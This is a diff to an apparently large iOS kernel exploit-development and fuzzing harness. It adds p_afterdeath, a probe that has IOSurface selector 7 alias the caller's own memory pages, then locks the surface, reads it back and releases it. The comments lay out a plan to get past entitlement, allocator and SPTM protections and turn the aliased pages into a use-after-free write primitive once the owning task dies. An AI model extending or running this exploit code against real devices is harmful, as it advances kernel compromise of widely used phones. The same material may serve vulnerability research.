@@ -23629,6 +23629,143 @@ static void p_uatrec(void) {
 //   - 0x41/foreign data              -> DATA-page cross (already closed in §134)
 // The scan runs BEFORE we write our marker, otherwise we would mask any
 // recycled content with it.
+// V154 (p_afterdeath): IOSurface sel7 — the cross-process class of primitive.
+//
+// New target class. Everything closed so far (scaler, jitbox, memory_pool,
+// GPU reclaim) failed for the same reason: to WRITE somewhere we need either
+// an address we control or a target we can observe, and every such target in
+// the AGX/IOSurface world sits behind a gate (find_surface ownership, private
+// entitlements, kalloc_type reset) or behind SPTM.
+//
+// sel7 (create_surface_client_mem) is a different mechanism entirely:
+// it does NOT copy. IOSurface::parse_properties builds an
+// IOMemoryDescriptor::withAddressRange(addr, size, kIODirectionOutIn,
+// owningTask) over the caller's own mapped pages, so the SURFACE ALIASES the
+// client's memory. Per docs/iosurface_sel_formats.md §4 the descriptor holds
+// references to those pages, and the surface can outlive the creating task.
+//
+// That inverts the ownership model the rest of the project hit: the surface
+// is reachable by id, and it points at pages whose lifetime is tied to a task
+// we control the death of. If the surface survives the task, the pages it
+// aliases are either freed (reclaim into the general allocator — the very
+// thing §134/§135 could not reach from the GPU side) or still mapped.
+//
+// Phase 1 (readable, cheap): does sel7 work at all from this sandbox, and can
+// the alias be observed? Then we hand the sid to a consumer (GPU blit via a
+// Metal surface over the same range) to prove the alias is live. Deciding
+// whether the surface survives our death needs a second process, which is
+// phase 2 and is why this phase only proves the alias first.
+static void p_afterdeath(void) {
+    LOG("[ad] v154 IOSurface sel7 client-memory alias probe");
+    io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+    if (!s) { LOG("[ad] no IOSurfaceRoot"); LOG("[ad] done (alive)"); return; }
+    io_connect_t uc = 0;
+    kern_return_t ok = IOServiceOpen(s, mach_task_self(), 0, &uc);
+    IOObjectRelease(s);
+    if (ok || !uc) { LOG("[ad] open failed 0x%08x", ok); LOG("[ad] done (alive)"); return; }
+
+    // A real client mapping with a recognisable pattern. must_map gives us a
+    // fresh page-backed region, so validateRange (mach_vm query per page)
+    // will accept it.
+    size_t sz = 0x40000;                       // 256 KB, several pages
+    uint8_t *buf = must_map(sz);
+    const uint8_t MARK = 0xAD;
+    for (size_t i = 0; i < sz; i++) buf[i] = MARK;
+    LOG("[ad] client buffer %p size 0x%zx filled 0x%02x", buf, sz, MARK);
+
+    uint8_t *outb = must_map(0x2000);
+    memset(outb, 0, 0x2000);
+    uint64_t sc[2] = { (uint64_t)(uintptr_t)buf, (uint64_t)sz };
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0; size_t osz = 3176;
+    LOG("[ad] calling sel7 (addr %p size 0x%zx)...", buf, sz);
+    fsync(fileno(stderr));
+    kern_return_t kr = IOConnectCallMethod(uc, 7, sc, 2, NULL, 0, osc, &nosc, outb, &osz);
+    uint32_t sid = *(uint32_t *)(outb + 0x18);
+    LOG("[ad] sel7 -> kr 0x%08x osz 0x%zx sid %u %s", kr, osz, sid,
+        kr == 0 ? "*** SURFACE ALIASES OUR MEMORY ***" : "");
+    LOG("[ad] checkpoint: sel7 returned, continuing to lock step");
+    fsync(fileno(stderr));
+    if (kr || !sid) {
+        // Documented iOS divergence: validateRange rejects unmapped ranges with
+        // 0x2c8, and a too-large size with 0x2bd. Record which, it tells us
+        // whether the path is size-gated or fully closed.
+        LOG("[ad] verdict: sel7 unavailable from this client (kr 0x%08x)", kr);
+        IOServiceClose(uc);
+        LOG("[ad] done (alive)");
+        return;
+    }
+
+    // Prove the alias is live and points at OUR bytes. sel2 (lock) hung in an
+    // earlier revision, so every step here is fsync'd: if it wedges, the log up
+    // to the wedge point is still pulled and tells us where it stopped.
+    uint8_t *sbuf = NULL; size_t total = 0, bpr = 0;
+    LOG("[ad] checkpoint: entering lock step"); fsync(fileno(stderr));
+    // sel2 lock(sid, opts) then read the lock result's base address.
+    {
+        uint8_t *inb = must_map(0x1000);
+        memset(inb, 0, 0x1000);
+        *(uint32_t *)(inb + 0) = sid;
+        *(uint64_t *)(inb + 4) = 0;                 // lock options
+        memset(outb, 0, 0x2000);
+        osz = 3176; nosc = 0;
+        kern_return_t kl = IOConnectCallMethod(uc, 2, NULL, 0, inb, 12,
+                                               osc, &nosc, outb, &osz);
+        LOG("[ad] sel2 lock sid %u -> kr 0x%08x osz 0x%zx", sid, kl, osz);
+        if (!kl) {
+            // IOSurfaceLockResult (docs/iosurface_sel_formats.md §1: sid is
+            // u32 @+0x18). Word 0 is the CPU base pointer, word 3 is the sid,
+            // word 4 the allocation size. An earlier revision read bpr/total
+            // as u32 at +0x14/+0x10, which decoded to 8022656 "bytes" and then
+            // read far past the mapping — that is the SIGSEGV in earlier runs.
+            uint64_t w[6];
+            for (int i = 0; i < 6; i++) w[i] = *(uint64_t *)(outb + i * 8);
+            LOG("[ad] lock result head: %016llx %016llx %016llx %016llx %016llx %016llx",
+                w[0], w[1], w[2], w[3], w[4], w[5]);
+            sbuf = (uint8_t *)(uintptr_t)w[0];
+            total = (size_t)w[4];
+            LOG("[ad] surface base %p sid-word %llu alloc %zu (client buf %p + 0x%zx)",
+                sbuf, (unsigned long long)w[3], total, buf, sz);
+            if (total > sz) {
+                // Never read past what we actually handed the kernel.
+                LOG("[ad] allocation %zu > client buffer 0x%zx — scanning only the "
+                    "buffer window", total, sz);
+                total = sz;
+            }
+        }
+        vm_deallocate(mach_task_self(), (vm_address_t)inb, 0x1000);
+    }
+    if (sbuf) {
+        long mark = 0, nz = 0;
+        size_t lim = total ? total : sz;
+        if (lim > sz) lim = sz;
+        for (size_t i = 0; i < lim; i++) {
+            if (sbuf[i] == MARK) mark++;
+            if (sbuf[i]) nz++;
+        }
+        LOG("[ad] surface content: %ld/%zu bytes == our marker 0x%02x, %ld nonzero — "
+            "alias %s", mark, lim, MARK, nz,
+            mark > (long)(lim / 2) ? "CONFIRMED (surface aliases our pages)"
+                                   : "NOT confirmed");
+    }
+    // unlock, then release the surface handle we own.
+    {
+        uint8_t *inb = must_map(0x1000);
+        memset(inb, 0, 0x1000);
+        *(uint32_t *)(inb + 0) = sid;
+        *(uint64_t *)(inb + 4) = 0;
+        memset(outb, 0, 0x2000);
+        osz = 4; nosc = 0;
+        IOConnectCallMethod(uc, 3, NULL, 0, inb, 12, osc, &nosc, outb, &osz);
+        uint64_t r64 = sid;
+        IOConnectCallScalarMethod(uc, 1, &r64, 1, NULL, NULL);   // sel1 release
+        vm_deallocate(mach_task_self(), (vm_address_t)inb, 0x1000);
+    }
+    IOServiceClose(uc);
+    LOG("[ad] done (alive) — surface released; survival-after-death is phase 2");
+    vm_deallocate(mach_task_self(), (vm_address_t)outb, 0x2000);
+}
+
 // V152 (p_mempool): IOSurfaceRootUserClient sel49-52 — the memory pool.
 // This is the one userclient path that allocates kernel-side pooled memory
 // sized by request, i.e. the classic under-allocation -> out-of-bounds write
@@ -25970,6 +26107,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_IDPROBE")) { p_idprobe(); LOG("[probe13] idprobe-only mode, stop"); return NULL; }
         if (getenv("FUZZ_SCALERDST")) { p_scalerdst(); LOG("[probe13] scalerdst-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MEMPOOL")) { p_mempool(); LOG("[probe13] mempool-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_AFTERDEATH")) { p_afterdeath(); LOG("[probe13] afterdeath-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
